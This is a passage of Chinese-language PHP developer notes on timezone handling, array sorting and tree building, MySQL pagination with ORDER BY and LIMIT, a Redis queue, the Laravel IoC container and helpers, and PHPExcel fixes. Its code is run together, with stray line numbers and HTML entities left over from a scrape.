$time = time(); &#125; return mktime( gmdate('G', $time), gmdate('i', $time), gmdate('s', $time), gmdate('n', $time), gmdate('j', $time), gmdate('Y', $time) ); &#125; date_default_timezone_set('Asia/Calcutta'); $current_date = date("Y/m/d g:i A"); $ist_date = DateTime::createFromFormat( '"Y/m/d g:i A"', $current_date, new DateTimeZone('Asia/Calcutta') ); $utc_date = clone $ist_date; $utc_date-&gt;setTimeZone(new DateTimeZone('UTC')); echo 'UTC: ' . $utc_date-&gt;format('Y-m-d g:i A'); $time = gmmktime(); echo date("Y-m-d H:i:s", $time); date_default_timezone_set("UTC");date("Y-m-d H:i:s", time() - date("Z"))date_default_timezone_set('Australia/Brisbane');echo gmdate('c');///2018-01-12T16:10:11+00:00最好是一直使用 UTC 时间。服务器使用，自己开发默认也是，然后存入数据库也是，这样的话把数据显示给用户看的话转换为适当时区的日期和时间就行了。时间戳是指格林尼治时间（GMT）1970年01月01日00时00分00秒到当前时间的总秒数。https://www.php.net/manual/en/timezones.phpfunction st_date($format,$timestamp = false) &#123; $timestamp = is_numberic($timestamp) ? $timestamp : time(); return gmdate($format,$timestamp + 8*3600);&#125;这样就可以保证这段代码无论在哪里，都可以输出东八区的时间。$triggerOn = '04/01/2013 03:08 PM';$user_tz = 'America/Los_Angeles';echo $triggerOn; // echoes 04/01/2013 03:08 PM$schedule_date = new DateTime($triggerOn, new DateTimeZone($user_tz) );$schedule_date-&gt;setTimeZone(new DateTimeZone('UTC'));$triggerOn = $schedule_date-&gt;format('Y-m-d H:i:s');echo $triggerOn; // echoes 2013-04-01 22:08:00格林威治时间（Greenwich Mean Time, GMT）。通用协调时间（Universal Time Coordinated, UTC）。UTC的表示方式为：年（y）、月（m）、日（d）、时（h）、分（min）、秒（s），均用数字表示。若以「世界标准时间」的角度来说，UTC比GMT来得更加精准： *UTC = GMT +/- 0.9* 。本地时间(locale time)：很显然，本地时间跟时区(timezone)有关： *本地时间 = UTC + 时区* 。例如，中国北京标准时间（忽略GMT和UTC的差异）： *CST = GMT + 8 = UTC + 8* 。Unix时间戳(Unix timestamp)，又称 Unix时间(Unix time) 或 POSIX时间(POSIX time) ，它从格林威治时间1970年01月01日00时00分00秒起至现在的总秒数。$usersNow = new DateTime('now', new DateTimeZone("+8"));//php5.5+echo $usersNow-&gt;format(DateTime::RFC3339);//2019-04-18T17:16:12+08:00$usersNow = new DateTime('now', new DateTimeZone('+0300'));$original = new DateTime("now", new DateTimeZone('UTC'));$timezoneName = timezone_name_from_abbr("", 3*3600, false);$modified = $original-&gt;setTimezone(new DateTimezone($timezoneName));$date = date_create('2000-01-01', timezone_open('Pacific/Nauru'));echo date_format($date, 'Y-m-d H:i:sP') . "\n";date_timezone_set($date, timezone_open('Pacific/Chatham'));echo date_format($date, 'Y-m-d H:i:sP') . "\n";为什么要时间戳？因为从0开始运行的秒数永远相等，即使出现润秒，也并不影响时间戳。php在使用date函数的时候，会依照所在时区去进行计算。date()进行输出的时间，就是我们所说的本地时间。可变：date()不可变：time()、gmdate()// 方法1date('Y-m-d H:i:s',strtotime(gmdate('Y-m-d H:i:s').' +8 hours'));// 方法2（推荐）gmdate('Y-m-d H:i:s',time() + 8*3600);$gmt_date = date('Y-m-d H:i:s',time() - date('Z'));$local_time = gmdate('Y-m-d H:i:s',time() + date('Z'));但这和$local_time = date('Y-m-d H:i:s');没有任何结果上的区别。只保存timestamp，也就是time()，它的值是固定的，不随着时区的调整而改变，即使更换了服务器，它的误差也很小，所以有利于今后将程序分发部署到不同的服务器上面。 function toTimeZone($src, $from_tz = 'America/Denver', $to_tz = 'Asia/Shanghai', $fm = 'Y-m-d H:i:s') &#123; $datetime = new DateTime($src, new DateTimeZone($from_tz)); $datetime-&gt;setTimezone(new DateTimeZone($to_tz)); return $datetime-&gt;format($fm); &#125; $time_zone = "GMT+8";$time = time();$date = date_create(date("Y-m-d H:i", $time), timezone_open('UTC'));$date = date_timezone_set($date, timezone_open($time_zone));$date = date_format($date, 'Y-m-d H:i');echo date("Y-m-d H:i:s"); // date() 返回的是: 当前(这一刻 time()函数执行/返回时) GMT标准时间 的"本地化时间" 的自定义格式时间// date()跟php系统设置的时区有关!echo gmdate("Y-m-d H:i:s");// gmdate() 返回的是: 当前(这一刻 time()函数执行/返回时) GMT标准时间 的自定义格式时间// gmdate() 跟你现在所处的位置无关, 跟php系统设置的时区无关!也就说， date()和gmdate()的区别, 仅仅在于 处理的时间 是不同的!INSERT INTO `table` (id, time) VALUES(NULL, UNIX_TIMESTAMP()); // or http://cn.voidcc.com/question/p-fvgnwppc-bc.html$time = time(); $query = "INSERT INTO `table` (id, time) VALUES(NULL, $time); 如果你想从数据库中选择它作为一个DATETIME，你可以这样做：SELECT *, FROM_UNIXTIME(time) as dt FROM `table` WHERE 1 产生的dt栏会格式为yyyy-MM-dd hh:mm:ss。 You have new mail in /var/spool/mail/root12345678910tac /var/spool/mail/root |morePHP Fatal error: require_once(): Failed opening required '../Redis/RedisManager.php' (include_path='.:/usr/local/lib/php/:/usr/share/pear:/usr/share/php') in /cron/test.php on line 8crotnab -e*/5 * * * 1-6 cd /cron/;/usr/local/bin/php /cron/test.php -t 15 tail -f /var/log/cronApr 18 18:00:02 xk-6-240-a8 CROND[23941]: (root) CMD (/usr/lib64/sa/sa1 1 1) Apr 18 18:00:02 xk-6-240-a8 CROND[23942]: (root) CMD (cd /cron/;/usr/local/bin/php /cron/test.php -t 15 对二维数组进行排序1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/** * 对二维数组进行按字段排序 * @param array $array 要排序的二维数组 * @param bool $orderby 根据该字段（二维数组单个元素中的键名）排序 * @param string $order 排序方式，asc:升序；desc:降序（默认） * @param string $children 子元素字段（键名），当元素含有该字段时，进行递归排序 * @return array */function array_orderby(&amp;$array,$orderby = null,$order = 'desc',$children = false) &#123; if($orderby == null) return $array; $key_value = $new_array = array(); foreach($array as $k =&gt; $v) &#123; $key_value[$k] = $v[$orderby]; &#125; if($order == 'asc') &#123; asort($key_value); &#125; else &#123; arsort($key_value); &#125; reset($key_value); foreach($key_value as $k =&gt; $v) &#123; $new_array[$k] = $array[$k]; // 如果有children if($children &amp;&amp; isset($new_array[$k][$children])) &#123; $new_array[$k][$children] = array_sort($new_array[$k][$children]); &#125; &#125; $new_array = array_values($new_array); // 使键名从0开始升序排列 $array = $new_array; return $new_array;&#125;$a = array( array('name' =&gt; 'Kenvi','age' =&gt; 18), array('name' =&gt; 'Nance','age' =&gt; 21), .....);array_orderby($a,'age','asc'); // 或者$a = array_orderby($a,'age','asc');$b = array( array( 'id' =&gt; 12,'count' =&gt; 36, 'children' =&gt; array( array('id' =&gt; 76,'count' =&gt; 40), array('id' =&gt; 98,'count' =&gt; 100) ) ), array('id' =&gt; 19,'count' =&gt; 87), ......);array_orderby($b,'count','desc','children');https://www.tangshuang.net/2077.html mysql orderby limit 翻页数据重复1234567891011121314151617181920212223242526272829303132333435SELECT `post_title`,`post_date` FROM post WHERE `post_status`='publish' ORDER BY view_count desc LIMIT 5,5使用上述SQL查询的时候，很有可能出现和LIMIT 0,5相同的某条记录，而如果使用：SELECT * FROM post WHERE `post_status`='publish' ORDER BY view_count desc LIMIT 5,5则不会出现重复的情况。但是，由于post表的字段很多，我仅仅希望用这两个字段，不想把post_content也查出来。为了解决这个情况，我在ORDER BY后面使用了两个排序条件来解决这个问题。SELECT `post_title`,`post_date` FROM post WHERE `post_status`='publish' ORDER BY view_count desc,ID asc LIMIT 5,5按理来说，mysql的排序默认情况下是以主键ID作为排序条件的，也就是说，如果在view_count相等的情况下，主键ID作为默认的排序条件，不需要我们多此一举加ID asc。但是事实就是，mysql再order by和limit混用的时候，出现了排序的混乱情况。其后的机理我尚不得而知，在阅读这篇文章后，好像有所领悟，下面做一下猜测。这篇文章的解释是：https://www.tangshuang.net/1827.html在MySQL 5.6的版本上，优化器在遇到order by limit语句的时候，做了一个优化，即使用了priority queue。……使用 priority queue 的目的，就是在不能使用索引有序性的时候，如果要排序，并且使用了limit n，那么只需要在排序的过程中，保留n条记录即可，这样虽然不能解决所有记录都需要排序的开销，但是只需要 sort buffer 少量的内存就可以完成排序。之所以5.6出现了第二页数据重复的问题，是因为 priority queue 使用了堆排序的排序方法，而堆排序是一个不稳定的排序方法，也就是相同的值可能排序出来的结果和读出来的数据顺序不一致。5.5 没有这个优化，所以也就不会出现这个问题。也就是说，mysql5.5是不存在本文提到的问题的，5.6版本之后才出现了这种情况。我们再看下mysql解释sql语言时的执行顺序：(7) SELECT (8) DISTINCT &lt;select_list&gt;(1) FROM &lt;left_table&gt;(3) &lt;join_type&gt; JOIN &lt;right_table&gt;(2) ON &lt;join_condition&gt;(4) WHERE &lt;where_condition&gt;(5) GROUP BY &lt;group_by_list&gt;(6) HAVING &lt;having_condition&gt;(9) ORDER BY &lt;order_by_condition&gt;(10) LIMIT &lt;limit_number&gt;在我们本文的案例sql中，执行顺序依次为form... where... select... order by... limit...由于上述priority queue的原因，在完成select之后，所有记录是以堆排序的方法排列的，在进行order by时，仅把view_count值大的往前移动。但由于limit的因素，排序过程中只需要保留到5条记录即可，view_count并不具备索引有序性，所以当第二页数据要展示时，mysql见到哪一条就拿哪一条，因此，当排序值相同的时候，第一次排序是随意排的，第二次再执行该sql的时候，其结果应该和第一次结果一样。 消息队列处理高并发123456789101112131415161718192021222324当用户点击按钮提交购买请求时，并不直接马上执行购买请求动作，而是将请求动作存入消息列队，用户的请求到此结束，而在服务器后台，从消息列队中逐一取出请求记录，再进行数据库操作，完成处理之后，将处理结果返回给用户。由于消息队列的存取是先进先出（和栈相反），因此，所有处理将按请求顺序进行处理。由于处理是在后台一个一个完成，因此不会对服务器和数据库造成巨大压力。$redis = new Redis();$redis-&gt;connect('127.0.0.1',6379);try &#123; $redis-&gt;LPUSH('click',$user_id);&#125;catch(Exception $e) &#123; echo $e-&gt;getMessage();&#125;$redis = new Redis();$redis-&gt;pconnect('127.0.0.1',6379);while(1) &#123; try&#123; $value = $redis-&gt;LPOP('click'); /** 利用$value进行逻辑和数据处理 */ &#125; catch(Exception $e) &#123; echo $e-&gt;getMessage(); &#125;&#125; 获取这两个字符串前面的相同部分1234567891011异或运算是一种非常特殊的运算，简单的说就是“如果两个值相同，返回0|false，如果两个值不同，则返回1|true”。function samestrin($str1, $str2) &#123; $pos = strspn($str1 ^ $str2, "\0"); if($pos) &#123; return substr($str1, 0, $pos); &#125; return null;&#125;https://www.tangshuang.net/82.html上述代码中，关键部分已经用红色表示出来了。一般情况下，当你对两个字符串进行异或操作的时候，相同的字符的异或结果是null(“\0”)，所以我们只要找出第一个非null(“\0”)字符就可以了。如此优雅的操作，得益于计算机领域的异或运算，如若没有这种算法，我们可能需要写一大堆代码来进行匹配对比。 samestrin('ab','abd')=&gt; "ab" 树形结构算法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226/** * 构建层级（树状）数组 * @param array $array 要进行处理的一维数组，经过该函数处理后，该数组自动转为树状数组 * @param string $pid 父级ID的字段名 * @return array|bool */function array_tree(&amp;$array, $pid = 'pid') &#123; // 子元素计数器 function array_children_count($array,$pid) &#123; $counter = array(); foreach($array as $item) &#123; $count = isset($counter[$item[$pid]]) ? $counter[$item[$pid]] : 0; $count ++; $counter[$item[$pid]] = $count; &#125; return $counter; &#125; // 把元素插入到对应的父元素children字段 function array_child_append($parent,$pid,$child) &#123; foreach($parent as &amp;$item) &#123; if($item['id'] == $pid) &#123; if(!isset($item['children'])) $item['children'] = array(); $item['children'][] = $child; &#125; &#125; return $parent; &#125; // 开始程序 $counter = array_children_count($array,$pid); // 如果顶级元素为0个，那么直接返回false if($counter[0] == 0) return false; // 准备顶级元素 $tree = array(); // 位移 while(isset($counter[0]) &amp;&amp; $counter[0] &gt; 0) &#123; // 如果顶级栏目的子元素计数器仍然大于0，那么仍然往下执行循环 $temp = array_shift($array); if(isset($counter[$temp['id']]) &amp;&amp; $counter[$temp['id']] &gt; 0) &#123; // 如果数组的第一个元素的子元素个数大于0，那么把该元素放置到数组的末端 array_push($array,$temp); &#125; else &#123; // 相反，如果该数组的第一个元素没有子元素，那么把该元素移动到其父元素的children字段中，同时，该元素从原数组中被删除 if($temp[$pid] == 0) $tree[] = $temp; else $array = array_child_append($array,$temp[$pid],$temp); &#125; $counter = array_children_count($array,$pid); &#125; $array = $tree; return $tree;&#125;$arr = array( array('id' =&gt; 53,'pid' =&gt; 0), array('id' =&gt; 64,'pid' =&gt; 53), array('id' =&gt; 70,'pid' =&gt; 42));//$r=array_tree($arr,'pid');print_r($r);$demo1 = array( 1 =&gt; array('id' =&gt; 1,'title' =&gt; 'title1','pid' =&gt; 0), 2 =&gt; array('id' =&gt; 2,'title' =&gt; 'title2','pid' =&gt; 1), 3 =&gt; array('id' =&gt; 3,'title' =&gt; 'title3','pid' =&gt; 1), 4 =&gt; array('id' =&gt; 4,'title' =&gt; 'title4','pid' =&gt; 2), 5 =&gt; array('id' =&gt; 5,'title' =&gt; 'title5','pid' =&gt; 2), 6 =&gt; array('id' =&gt; 6,'title' =&gt; 'title6','pid' =&gt; 0));$demo1 = array_tree($demo1);// 或者直接使用array_tree($demo1);，无需返回值https://www.tangshuang.net/2073.html https://3v4l.org/kngT8print_r($demo1);Array( [0] =&gt; Array ( [name] =&gt; Nance [age] =&gt; 21 ) [1] =&gt; Array ( [name] =&gt; Kenvi [age] =&gt; 18 ))Array( [0] =&gt; Array ( [id] =&gt; 6 [title] =&gt; title6 [pid] =&gt; 0 ) [1] =&gt; Array ( [id] =&gt; 1 [title] =&gt; title1 [pid] =&gt; 0 [children] =&gt; Array ( [0] =&gt; Array ( [id] =&gt; 3 [title] =&gt; title3 [pid] =&gt; 1 ) [1] =&gt; Array ( [id] =&gt; 2 [title] =&gt; title2 [pid] =&gt; 1 [children] =&gt; Array ( [0] =&gt; Array ( [id] =&gt; 4 [title] =&gt; title4 [pid] =&gt; 2 ) [1] =&gt; Array ( [id] =&gt; 5 [title] =&gt; title5 [pid] =&gt; 2 function array_tree($array) &#123; $result = array(); $tmp = array(); foreach($array as $item) &#123; if($item['parent_id'] == 0) &#123; $i = count($result); $result[$i] = $item; $id = $item['id']; $tmp[$id] = &amp;$result[$i];//这一句保证了当无论$tmp[$id]还是$result[$i]发生变化，都会让另外一个值同时发生变化。而 $tmp[$parent_id]['children'][$i] = $item; 实际上导致$result[$parent_id]发生了变化。 &#125; else &#123; $id = $item['id']; $parent_id = $item['parent_id']; $parent = $tmp[$parent_id]; $i = count($parent['children']); $tmp[$parent_id]['children'][$i] = $item; $tmp[$id] = &amp;$tmp[$parent_id]['children'][$i]; &#125; &#125; return $result; &#125; 当$b = &amp;$a时，$b和$a同时引用同一个内容（指针指向同一块内存），无论$a或$b谁发生变化，这个内容都会发生变化，进而呈现为$a和$b保持同步的变化。 https://www.tangshuang.net/1701.html print_r(array_tree($demo1)); Array ( [0] =&gt; Array ( [id] =&gt; 1 [title] =&gt; title1 [parent_id] =&gt; 0 [children] =&gt; Array ( [0] =&gt; Array ( [id] =&gt; 2 [title] =&gt; title2 [parent_id] =&gt; 1 [children] =&gt; Array ( [0] =&gt; Array ( [id] =&gt; 4 [title] =&gt; title4 [parent_id] =&gt; 2 ) [1] =&gt; Array ( [id] =&gt; 5 [title] =&gt; title5 [parent_id] =&gt; 2 ) ) ) [1] =&gt; Array ( [id] =&gt; 3 [title] =&gt; title3 [parent_id] =&gt; 1 ) ) ) [1] =&gt; Array ( [id] =&gt; 6 [title] =&gt; title6 [parent_id] =&gt; 0 ) ) $tmp[$id] = &amp;$tmp[$parent_id]['children'][$i];这一句起到了关键性作用。加上这一句之后，我们再来跑一遍array('id' =&gt; 23,'parent_id' =&gt; 12,...)这个元素。 [2]=&gt; array('id' =&gt; 12,'parent_id' =&gt; 5,...) $tmp[5]['children'][0] = array('id' =&gt; 12,'parent_id' =&gt; 5,...) // 重新从①开始演示 $result[0]['children'][0] = array('id' =&gt; 12,'parent_id' =&gt; 5,...) // 内部结果 $tmp[12] = &amp;$tmp[5]['children'][0] // 第二个&amp;出现了 [5]=&gt; array('id' =&gt; 23,'parent_id' =&gt; 12,...) $tmp[12]['children'][0] = array('id' =&gt; 23,'parent_id' =&gt; 12,...) 由于第二个&amp;引用的原因，实际上发生了： $tmp[5]['children'][0]['children'][0] = array('id' =&gt; 23,'parent_id' =&gt; 12,...) // 内部结果 $result[0]['children'][0]['children'][0] = array('id' =&gt; 23,'parent_id' =&gt; 12,...) // 内部结果 这个时候你可能已经看出了端倪。父子关系变成了 5 &gt; 12 &gt; 23，而这组关系，全部存储在了id=5的这个顶级元素中，以多重的children元素实现了父子孙结构。 PHP进程分支设计123456789101112131415161718192021222324252627282930313233https://github.com/tangshuang/php-events-async-callback https://www.tangshuang.net/2086.html$pid = pcntl_fork();if($pid &gt; 0)&#123; //父进程代码 exit(0);&#125;elseif($pid == 0) &#123; //子进程代码 exit(0);&#125;你会发现httpd或php-fpm的进程会增加，也就是说，pcntl其实是通过重新开启php进程，并通过其他机制实现进程之间的通信的。proc_open，popen也是利用httpd来实现多进程$proc=proc_open("echo foo", array( array("pipe","r"), array("pipe","w"), array("pipe","w")), $pipes); print stream_get_contents($pipes[1]);require 'Events.php';require 'EventListener.class.php';$EventListener = new EventListener('timeout');$EventListener-&gt;add('timeout','setTimeout');function setTimeout() &#123; sleep(10); file_put_contents('./log.txt','延时回调成功，现在时间：'.date('Y-m-d H:i:s'),FILE_APPEND);&#125;// 你自己的代码流程https://github.com/tangshuang/php-events-async-callbackfile_put_contents('./log.txt','延时操作开始，现在时间：'.date('Y-m-d H:i:s')."\r",LOCK_EX);$EventListener-&gt;run('timeout'); shell重启服务1234567891011在shell脚本中对服务进行判断，如果nginx或者httpd宕机了，就执行一条重启命令：#!/bin/bash#nginxps -ef | grep nginx |grep -v grep &gt; /dev/nullif [ $? != 0 ];then service nginx restart &gt; /dev/nullfi#httpdps -ef | grep httpd |grep -v grep &gt; /dev/nullif [ $? != 0 ];then service httpd restart &gt; /dev/nullfi Laravel IoC 服务容器类管理工具高层次的模块不应该依赖于低层次的模块，两者都应该依赖于抽象接口。抽象接口不应该依赖于具体实现。而具体实现则应该依赖于抽象接口。class MySQLConnection&#123; /** * 数据库连接 */ public function connect() &#123; var_dump(‘MYSQL Connection’); &#125;&#125;class PasswordReminder&#123; /** * @var MySQLConnection */ private $dbConnection; public function __construct(MySQLConnection $dbConnection) &#123; $this-&gt;dbConnection = $dbConnection; &#125;&#125;大家常常会有一个误解，那就是依赖反转就只是依赖注入的另一种说法。但其实二者是不同的。在上面的代码示例中，尽管在 PasswordReminder 类中注入了 MySQLConnection 类，但它还是依赖于 MySQLConnection 类。然而，高层次模块 PasswordReminder 是不应该依赖于低层次模块 MySQLConnection 的。如果我们想要把 MySQLConnection 改成 MongoDBConnection，那我们就还得手动修改 PasswordReminder 类构造函数里的依赖。interface ConnectionInterface&#123; public function connect();&#125;class DbConnection implements ConnectionInterface&#123; /** * 数据库连接 */ public function connect() &#123; var_dump(‘MYSQL Connection’); &#125;&#125;class PasswordReminder&#123; /** * @var DBConnection */ private $dbConnection; public function __construct(ConnectionInterface $dbConnection) &#123; $this-&gt;dbConnection = $dbConnection; &#125;&#125; IoC 容器简单地理解为就是一个容器，里面装的是类的依赖。namespace App\Repositories;interface OrderRepositoryInterface &#123; public function getAll();&#125;namespace App\Repositories;class DbOrderRepository implements OrderRepositoryInterface&#123; function getAll() &#123; return 'Getting all from mysql'; &#125;&#125;namespace App\Http\Controllers;use Illuminate\Http\Request;use App\Http\Requests;use App\Repositories\OrderRepositoryInterface;class OrdersController extends Controller&#123; protected $order; function __construct(OrderRepositoryInterface $order) &#123; $this-&gt;order = $order; &#125; public function index() &#123; dd($this-&gt;order-&gt;getAll()); return View::make(orders.index); &#125;&#125;Route::resource('orders', 'OrdersController');App::bind('App\Repositories\OrderRepositoryInterface', 'App\Repositories\DbOrderRepository');定义一个容器类：class SimpleContainer &#123; protected static $container = []; public static function bind($name, Callable $resolver) &#123; static::$container[$name] = $resolver; &#125; public static function make($name) &#123; if(isset(static::$container[$name]))&#123; $resolver = static::$container[$name] ; return $resolver(); &#125; throw new Exception("Binding does not exist in containeer"); &#125;&#125;class LogToDatabase &#123; public function execute($message) &#123; var_dump('log the message to a database :'.$message); &#125;&#125;class UsersController &#123; protected $logger; public function __construct(LogToDatabase $logger) &#123; $this-&gt;logger = $logger; &#125; public function show() &#123; $user = 'JohnDoe'; $this-&gt;logger-&gt;execute($user); &#125;&#125;绑定依赖：SimpleContainer::bind('Foo', function() &#123; return new UsersController(new LogToDatabase); &#125;);$foo = SimpleContainer::make('Foo');print_r($foo-&gt;show());Laravel 的服务容器源码：vendor/laravel/framwork/src/Illuminate/Container/Container.php public function bind($abstract, $concrete = null, $shared = false) &#123; $abstract = $this-&gt;normalize($abstract); $concrete = $this-&gt;normalize($concrete); if (is_array($abstract)) &#123; list($abstract, $alias) = $this-&gt;extractAlias($abstract); $this-&gt;alias($abstract, $alias); &#125; $this-&gt;dropStaleInstances($abstract); if (is_null($concrete)) &#123; $concrete = $abstract; &#125; if (! $concrete instanceof Closure) &#123; $concrete = $this-&gt;getClosure($abstract, $concrete); &#125; $this-&gt;bindings[$abstract] = compact('concrete', 'shared'); if ($this-&gt;resolved($abstract)) &#123; $this-&gt;rebound($abstract); &#125; &#125; public function make($abstract, array $parameters = []) &#123; $abstract = $this-&gt;getAlias($this-&gt;normalize($abstract)); if (isset($this-&gt;instances[$abstract])) &#123; return $this-&gt;instances[$abstract]; &#125; $concrete = $this-&gt;getConcrete($abstract); if ($this-&gt;isBuildable($concrete, $abstract)) &#123; $object = $this-&gt;build($concrete, $parameters); &#125; else &#123; $object = $this-&gt;make($concrete, $parameters); &#125; foreach ($this-&gt;getExtenders($abstract) as $extender) &#123; $object = $extender($object, $this); &#125; if ($this-&gt;isShared($abstract)) &#123; $this-&gt;instances[$abstract] = $object; &#125; $this-&gt;fireResolvingCallbacks($abstract, $object); $this-&gt;resolved[$abstract] = true; return $object; &#125; public function build($concrete, array $parameters = []) &#123; if ($concrete instanceof Closure) &#123; return $concrete($this, $parameters); &#125; $reflector = new ReflectionClass($concrete); if (! $reflector-&gt;isInstantiable()) &#123; if (! empty($this-&gt;buildStack)) &#123; $previous = implode(', ', $this-&gt;buildStack); $message = "Target [$concrete] is not instantiable while building [$previous]."; &#125; else &#123; $message = "Target [$concrete] is not instantiable."; &#125; throw new BindingResolutionException($message); &#125; $this-&gt;buildStack[] = $concrete; $constructor = $reflector-&gt;getConstructor(); if (is_null($constructor)) &#123; array_pop($this-&gt;buildStack); return new $concrete; &#125; $dependencies = $constructor-&gt;getParameters(); $parameters = $this-&gt;keyParametersByArgument( $dependencies, $parameters ); $instances = $this-&gt;getDependencies($dependencies,$parameters); array_pop($this-&gt;buildStack); return $reflector-&gt;newInstanceArgs($instances); &#125; $this-&gt;app-&gt;bind('HelpSpot\API', function ($app) &#123; return new HelpSpot\API($app-&gt;make('HttpClient')); &#125;);$api = new HelpSpot\API(new HttpClient);$this-&gt;app-&gt;instance('HelpSpot\API', $api);https://learnku.com/laravel/t/26922 https://github.com/nahidulhasan/laravel-service-containerIoc 是一个简单的组件，可以更加方便地解析依赖项。你可以将对象形容为容器，并且每次解析类时，都会自动注入依赖项。$auth = new SimpleAuth( new FileSessionStorage() );因为 Application 类继承自 Container 类，所以你可以通过 App 门面来访问容器。App::bind( 'FileSessionStorage', function()&#123; return new FileSessionStorage;&#125;);https://learnku.com/laravel/t/26721App:bind( 'SessionStorage', 'MysqlSessionStorage' );//SessionStorage是接口,MysqlSessionStorage和FileSessionStorage继承ta，调用的时候注入SessionStorage $session 如果我们想要切换我们的存储服务，我们只要变更一下这个绑定。App:bind( 'SessionStorage', 'FileSessionStorage ' );laravel面试哪些问题 v2ex laravel函数12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788//在给定值后返回字符串的其余部分。function after($subject, $search) &#123; dump(explode($search, $subject, 2),array_reverse(explode($search, $subject, 2))); //array:2 [▼ 0 =&gt; "" 1 =&gt; "试laravel函数" ] array:2 [▼ 0 =&gt; "试laravel函数" 1 =&gt; "" ] return $search === '' ? $subject : array_reverse(explode($search, $subject, 2))[0]; &#125;$s = '测试laravel函数';echo after($s,'测');//试laravel函数function ascii($value, $language = 'en') &#123; $languageSpecific = languageSpecificCharsArray($language); if (! is_null($languageSpecific)) &#123; $value = str_replace($languageSpecific[0], $languageSpecific[1], $value); &#125; foreach ( charsArray() as $key =&gt; $val) &#123; $value = str_replace($val, $key, $value);//循环将数组内的字符串替换 &#125; return preg_replace('/[^\x20-\x7E]/u', '', $value); &#125;function languageSpecificCharsArray($language) &#123; static $languageSpecific; if (! isset($languageSpecific)) &#123; $languageSpecific = [ 'bg' =&gt; [ ['х', 'Х', 'щ', 'Щ', 'ъ', 'Ъ', 'ь', 'Ь'], ['h', 'H', 'sht', 'SHT', 'a', 'А', 'y', 'Y'], ], 'de' =&gt; [ ['ä', 'ö', 'ü', 'Ä', 'Ö', 'Ü'], ['ae', 'oe', 'ue', 'AE', 'OE', 'UE'], ], ]; &#125; return $languageSpecific[$language] ?? null; &#125;function charsArray() &#123; static $charsArray; if (isset($charsArray)) &#123; return $charsArray; &#125; return $charsArray = [ '0' =&gt; ['°', '₀', '۰', '０'], '1' =&gt; ['¹', '₁', '۱', '１'], '2' =&gt; ['²', '₂', '۲', '２'], '3' =&gt; ['³', '₃', '۳', '３'], '4' =&gt; ['⁴', '₄', '۴', '٤', '４'], '5' =&gt; ['⁵', '₅', '۵', '٥', '５'], '6' =&gt; ['⁶', '₆', '۶', '٦', '６'], '7' =&gt; ['⁷', '₇', '۷', '７'], '8' =&gt; ['⁸', '₈', '۸', '８'], '9' =&gt; ['⁹', '₉', '۹', '９'], &#125; 将utf - 8值转换为ASCII ascii($s);//laravel//在给定值之前获取字符串的部分。function before($subject, $search) &#123; return $search === '' ? $subject : explode($search, $subject)[0]; &#125; //将一个值转换为一个大写的大写字母 function studly($value) &#123; $key = $value; if (isset(static::$studlyCache[$key])) &#123; return static::$studlyCache[$key]; &#125; $value = ucwords(str_replace(['-', '_'], ' ', $value)); return static::$studlyCache[$key] = str_replace(' ', '', $value); &#125; 路由为不区分大小写1234567891011121314151617181920212223242526272829303132333435添加中间件. LowerCaseRoutes&lt;?phpnamespace App\Http\Middleware;use Closure;use \Illuminate\Support\Facades\Redirect;/** * 把大写uri转换为小写.已经实现路由不区分大小写，如果有大写，会 301 跳转到小写的地址. https://learnku.com/laravel/t/27783 * Class LowerCaseRoutes * @package App\Http\Middleware */class LowerCaseRoutes&#123; /** * Handle an incoming request. * * @param \Illuminate\Http\Request $request * @param \Closure $next * @return mixed */ public function handle($request, Closure $next) &#123; if (preg_match('/([A-Z]+)/', $request-&gt;path(), $match)) &#123; $newRoute = str_replace($request-&gt;path(), strtolower($request-&gt;path()), $request-&gt;fullUrl()); return Redirect::to($newRoute, 301); &#125; return $next($request); &#125;&#125; 数组扁平化123456789101112131415161718192021222324252627282930$data = [ 'testArray' =&gt; [ 'string1', 'string2', [ 'string1', 'string2', ], ], 'teststring'];echo "&lt;pre&gt;";https://learnku.com/articles/24318print_r(iterator_to_array( new RecursiveIteratorIterator( new RecursiveArrayIterator($data) ), false // use_keys:默认true ));/*Array( [0] =&gt; string1 [1] =&gt; string2 [2] =&gt; string1 [3] =&gt; string2 [4] =&gt; teststring)*/collect ($data)-&gt;flatten ()-&gt;all () phpexcel科学计数法12345678910拼一个 \t设置单元格格式为文本格式https://learnku.com/articles/23696 $card_no_style = [ 'numberFormat' =&gt; [ 'formatCode' =&gt; NumberFormat::FORMAT_TEXT ] ]; $obj_sheet-&gt;getStyle(Coordinate::stringFromColumnIndex($column) . "1" . ":" . Coordinate::stringFromColumnIndex($column) . count($data))-&gt;applyFromArray($card_no_style); PHPExcel 在 PHP7.0 以上版本报错123456789101112131415161718192021222324252627282930313233343536373839404142434445464748'break' not in the 'loop' or 'switch' contextPHPExcel\Calculation\Functions.php LINE: 581if (($value === NULL) || (is_float($value)) || (is_int($value))) &#123; return 1; &#125; elseif(is_bool($value)) &#123; return 4; &#125; elseif(is_array($value)) &#123; return 64; break;//这是581行 &#125; elseif(is_string($value)) &#123; // Errors if ((strlen($value) &gt; 0) &amp;&amp; ($value&#123;0&#125; == '#')) &#123; return 16; &#125; return 2; &#125; return 跳出当前函数或者循环直接返回 break 并会执行而报错https://learnku.com/articles/26675 方案 1: 将 581 行的 break 注释掉 方案 2 : 将 PHPExcel 升级到 1.81 版本以上 方案三：使用 PHPExcel 的升级产品 PhpSpreadsheet 方案 1 修改源码 不推荐 方案 2PHPExcel 已不再维护 故不推荐 对于框架版本国过老 或经多手的项目 建议使用 方案 1,2 方案 3 为 PHPExcel 的替代品升级产品 而且在维护 新项目推荐方案 3 PHPExcel 1.8.1 地址 https://github.com/PHPOffice/PHPExcel/commit/372c7cbb695a6f6f1e62649381aeaa37e7e70b32 PhpSpreadsheet 安装 如下 文档地址：https://phpspreadsheet.readthedocs.io/en/latest/#getting-started GitHub 下载：https://github.com/PHPOffice/PhpSpreadsheet composer 安装：composer require phpoffice/phpspreadsheet PHPExcel 与 PhpSpreadsheet？ PhpSpreadsheet 是 PHPExcel 的下一个版本。它打破了兼容性，大大提高了代码库质量（命名空间，PSR 合规性，最新 PHP 